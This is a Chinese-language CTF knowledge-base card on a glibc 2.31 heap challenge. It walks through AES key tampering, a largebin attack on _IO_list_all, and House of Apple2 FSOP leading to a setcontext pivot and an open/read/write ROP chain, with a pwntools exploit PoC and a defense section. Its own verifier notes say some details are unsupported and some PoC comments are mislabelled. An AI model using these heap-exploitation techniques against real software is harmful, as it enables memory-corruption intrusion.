---
id: binary-pwn-heap-aes-key-known-then-largebin-io-list-all-house-of-apple2-orw
title: 已知 AES key 但 add 只给 0x30 且分配被锁在堆内时：连续伪造 largebin chunk 打 _IO_list_all → House of Apple2（_IO_wfile_jumps-0x40 + setcontext+61）做 ORW
type: scenario
domain: binary
path: binary/pwn/heap
technique: aes-key-known-largebin-io-list-all-house-of-apple2-orw
tags:
- pwn
- heap
- glibc231
- largebin-attack
- fsop
- house-of-apple2
- io-list-all
- setcontext
- orw
- aes
- ctf
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-09'
updated: '2026-11-09'
verification:
  verified_by: verifier-T2-3W7
  verified_at: '2026-11-09T01:57:06+08:00'
  notes: 已对照原文核对；本次核对未读取图片，仅依据正文；libc 2.31 + 沙箱禁 execve、AES_ECB 自实现、初始化生成 key 且用 chunk 地址派生 heap 限制、delete 不置空 UAF、add 先写明文再加密导致长度不整除 0x10 时明文直落、show 解密到栈、edit(1,'B'*0xf) 只改 key 前 15 字节且末字节实测固定 0xba、tcache fd 低字节改 0xa0 取 key chunk、p16 接力把 size 改到 0x440/0x441/0x451/0x461、largebin attack 打 _IO_list_all-0x20、House of Apple2（_IO_wfile_jumps-0x40 + setcontext+61 + ROP_addr）、gets 二次输入铺 open/read/write 均与正文 exp 一致。未验证点：(1) 卡内「分配上限锁在 0x1000 内」的具体数值正文未给出（正文只说用 heap 基址限制申请出的 chunk 地址，数值来自同赛另一题题解），触发条件里宜改为「分配被限制在堆内」；(2) PoC 中第三、四字段注释把 heap+0x530 标为 bk_nextsize 落点、_IO_list_all-0x20 标为写入目标，与原理段「bk_nextsize=_IO_list_all-0x20、fd_nextsize=待写 FILE 地址」的字段对应相反，仅注释问题、取值与正文一致；(3) 具体 libc 偏移与 gadget 已按卡内约定用占位符
url: /docs/binary/pwn/heap/binary-pwn-heap-aes-key-known-then-largebin-io-list-all-house-of-apple2-orw/
draft: false
kb_aliases:
- 强网杯2024 final heap
- 0x30 申请上限伪造 largebin chunk
- largebin attack _IO_list_all
- House of Apple2 _IO_wfile_jumps
- setcontext 61 ORW
- AES key 已知后的 FSOP
---

## 一句话结论

在 AES 自实现加密的堆题里，密钥被篡改（只写 15 字节让加密失败）后虽说"加解密全可控"，但如果 `add` 只允许申请 0x30 大小、且分配上限被锁在 key chunk 附近的 0x1000 范围内，tcache/`__free_hook` 那套就都走不通；可行路线是用多次 0x30 申请沿块头"接力"伪造出 `0x440`/`0x450`/`0x460` 的 fake chunk，把它们串成 **largebin attack** 写 `_IO_list_all-0x20`，随后用一块布好的 `_IO_FILE_plus`（`_IO_wfile_jumps-0x40` 作 vtable、`setcontext+61` 作 `_wide_data` 落点）在 `exit`/`fclose` 时切到堆上 ROP，`gets` 二次输入后 ORW 拿 flag。

## 原理

- **前提：key 已被攻克**。UAF 改 tcache fd 的低字节把 key chunk 申请出来，`edit` 只写 15 字节（长度不整除 0x10 → 加密被跳过）使 key 前 15 字节可控、第 16 字节保持程序原值（本题实测固定为 `0xba`，不必爆破）；此后 `add`/`edit` 前先用本地 `AES.new(key, ECB).decrypt()` 预处理，`show` 的输出再用 `.encrypt()` 逆回。
- **为什么绕开 tcache 投毒**：`add` 只走同一个 0x30 大小的 bin，且分配地址被初始化时的 `heap_base` 限制在 0x1000 内——要投毒到 `__free_hook`/`_IO_list_all` 这类堆外地址会被直接拒绝，safe-linking 之外还多了一层"物理范围"限制。于是只能**在堆内伪造结构**，让 glibc 自己的链表操作把指针写出去。
- **伪造 largebin chunk 的关键**：largebin 的插入会写 `fwd->bk_nextsize`/`bk->fd` 等指针，攻击价值来自"`bk_nextsize` 指向攻击者可控地址，插入时写入 chunk 地址"。要触发这条路径，victim chunk 必须真的落在 largebin 的 size 区间（> 0x400 且非 tcache 范围）。程序只给 0x30，所以要用 p16 低位覆盖法逐步把某个块的 `size` 从 `0x31` 改成 `0x441`/`0x451`/`0x461`，每改一次都重新 free/alloc 让它按新 size 归类，最终凑出 `0x440` 量级的块进入 largebin。
- **`_IO_list_all-0x20` 的用意**：largebin attack 的写入目标是 `chunk_addr` 被写到 `bk_nextsize->fd_nextsize`（即 `target+0x20`），因此目标取 `_IO_list_all-0x20`，写入后 `_IO_list_all` 恰好等于伪造 FILE 的地址；`exit` → `_IO_flush_all_lockp` 遍历链表时就会走到它。
- **House of Apple2 的两个落点**：伪造的 `_IO_FILE_plus` 把 `vtable` 指到 `_IO_wfile_jumps-0x40`（让 `_IO_wfile_overflow`/`_IO_wdoallocbuf` 系列的调用偏移落到能用的函数上），`_wide_data` 与其中的 `_wide_vtable` 再指到一块可控内存，最终 `setcontext+61` 被调用——`setcontext` 会从 `rdi+0x??` 起恢复一整套寄存器（含 `rsp`），于是栈被搬到堆上的 ROP 链，`ret` gadget 只用于对齐栈。
- **为什么还要 `gets`**：0x30 的写入窗口装不下完整 ORW 链，先用短链 `pop rdi; <堆缓冲区>; gets; 0` 把攻击者的长输入读进已知地址，再让 FSOP 触发跳转，第二次输入即为完整 `open/read/write` 链（沙箱只禁 `execve`）。

## 触发条件

- 菜单堆题，读写经自实现 AES（长度不整除 0x10 时明文直落 / 解密结果落栈）。
- `add` 只允许单一小块（本例 0x30 请求），且分配地址被限制在 `heap_base` 附近（堆内），无法把 tcache 链投毒到堆外。
- libc 2.31（`_IO_wfile_jumps`、`setcontext+61` 可用；`_IO_list_all` 仍参与 `exit` 刷新），沙箱禁 `execve`。
- 已取得 key（见上）并能读到 unsorted bin 残留 `fd` 泄 libc。
- 程序有可被触发的 `exit`/`fclose` 路径（本例提交菜单项 6 结束）。

## 利用步骤

1. 改 key：`edit` 低字节把 tcache fd 指向 key chunk，两次 `add` 取回，只写 15 字节（末字节留原值，本题为 `0xba`）。此后本地 `AES.new(b"B"*15 + b"\xba", ECB)` 与目标同步。
2. 泄 libc：把 0x30 块接力改 size 到 `0x440` 档并 free 进 unsorted bin，`show` 读前 16 字节，解密后减偏移得 libc 基址。
3. 伪造 largebin chunk 并打 `_IO_list_all`：把一块的 `bk_nextsize` 布成 `_IO_list_all-0x20`、`fd_nextsize` 布成待写入的伪造 FILE 地址，再 free 进 largebin 触发插入写。
4. 布 `_IO_FILE_plus`：`vtable = _IO_wfile_jumps-0x40`，`_wide_data` 指向堆上 `A+0xe0-0x60` 的可控块，`_wide_vtable` 落点放 `setcontext+61`，`rsp` 落点放堆上 ROP 区（本例 `heap+0x340`），链首放一个 `ret` 对齐。
5. 触发：提交退出菜单项，`exit` → `_IO_flush_all` → 伪造 FILE → `setcontext` 切栈 → 短链调 `gets` 读入长 ORW 链。
6. ORW：`open("/flag")` → `read(fd, buf, 0x50)` → `write(1, buf, 0x50)`。

## PoC

```python
from pwn import *
from Crypto.Cipher import AES

key = b"B" * 0xf + p8(0xba)
cipher = AES.new(key, AES.MODE_ECB)
enc = lambda d: cipher.decrypt(d)          # 目标侧会再 encrypt 一次

# 1. 已篡改 key 并泄出 libc
libc.address = u64(get_key(2)[:8]) - <main_arena 偏移>

# 2. largebin attack：把伪造 FILE 地址写进 _IO_list_all
payload  = p64(libc.address + <main_arena+96 偏移>) * 2
payload += p64(heap + 0x530)                       # bk_nextsize 落点
payload += p64(libc.sym['_IO_list_all'] - 0x20)    # 写入目标 -0x20
edit(6, enc(payload))
dele(4)                                            # 进 largebin，触发插入

# 3. House of Apple2：伪造 _IO_FILE_plus
FP      = heap + 0x4b0
A       = FP + 0x100
B       = A + 0xe0 - 0x60
ROP     = heap + 0x340
buf  = (0xa0 - 0x10) * b"\x00" + p64(A)
buf  = buf.ljust(0xb0, b"\x00") + p64(1)
buf  = buf.ljust(0xc8, b"\x00") + p64(libc.sym['_IO_wfile_jumps'] - 0x40)
buf  = buf.ljust(0x190, b"\x00") + p64(ROP) + p64(libc.address + <ret gadget>)
buf  = buf.ljust(0xf0 + 0xe0, b"\x00") + p64(B) + p64(libc.sym['setcontext'] + 61)

# 4. 短链：让 gets 把长 ROP 读进堆缓冲区
edit(1, enc(p64(libc.address + <pop_rdi>) + p64(ROP) + p64(libc.sym['gets']) + p64(0)))

p.sendlineafter(">>", '6')                # 触发 exit → FSOP → setcontext

# 5. 完整 ORW
chain  = p64(ret) * 5 + p64(pop_rdi) + p64(heap + 0x410)
chain += p64(pop_rsi) + p64(0) + p64(pop_rdx) + p64(0) * 3 + p64(libc.sym['open'])
chain += p64(pop_rdi) + p64(3) + p64(pop_rsi) + p64(heap)
chain += p64(pop_rdx) + p64(0x50) + p64(0) * 2 + p64(libc.sym['read'])
chain += p64(pop_rdi) + p64(1) + p64(libc.sym['write']) + b"/flag\x00"
p.sendline(chain)
```

## 变体与关联

- **换 FSOP gadget**：`_IO_wfile_jumps` 可换 `_IO_str_jumps`/`_IO_file_jumps` 的偏移组合，落点也可用 `setcontext+61` 之外的 `longjmp` 式跳板；House of Apple2 只要求能控制 `_wide_data` 与 `vtable` 两处。
- **换写原语**：`_IO_list_all` 也可由 `_IO_2_1_stdout_`/`stderr` 直接覆盖获得（无 largebin 时），或改打 `__exit_funcs`（2.31 仍可用）。
- **前置差异**：本文的前置是 AES key 篡改（同一比赛另一题的解法是 unlink 改全局指针数组 + `environ` 泄栈 + `gets` 二次溢出），两者共享 key 攻克与二次溢出思路，后半段的写原语不同。
- **关联**：[[binary-pwn-heap-aes-key-tcache-poison-unlink-booklist-environ-rop]]（同系列前置 key 篡改 + unlink/environ 路线）、[[binary-pwn-heap-edit-oob-freed-largebin-house-of-apple2-orw]]（largebin + House of Apple2 的另一入口）、[[binary-pwn-heap-glibc235-environ-front-chunk-overread-stack-orw]]（ORW 终点对照）、[[ctf-pwn-uaf-low4byte-next-fake-unsorted-overlap-freehook]]（低字节改链通用形态）。

## 检测与防御

- **出题/代码审计视角**：把 `add` 的 size 固定与"只允许堆内分配"当缓解手段并不充分——只要存在可改块头的写入点，glibc 的链表插入照样能把指针写到堆外；真正有效的是 `delete` 置空、`add` 校验槽位占用、自实现加密正确处理非整组长度。
- **现实软件视角**：同类模式出现在自研加密容器/序列化组件（长度取整错误 → 未加密数据直落、解密失败输出栈残留 → 信息泄露），配合任意 UAF 即可把"完整性校验"降级为可控解密。
- **边界**：本卡后半段强依赖 libc 2.31 的 `_IO_wfile_jumps` 与 `setcontext` 行为，2.35+ 需换 `_IO_list_all` 的新链与 `setcontext` 偏移；原文未给出各偏移的推导过程，卡内偏移以占位符表示。
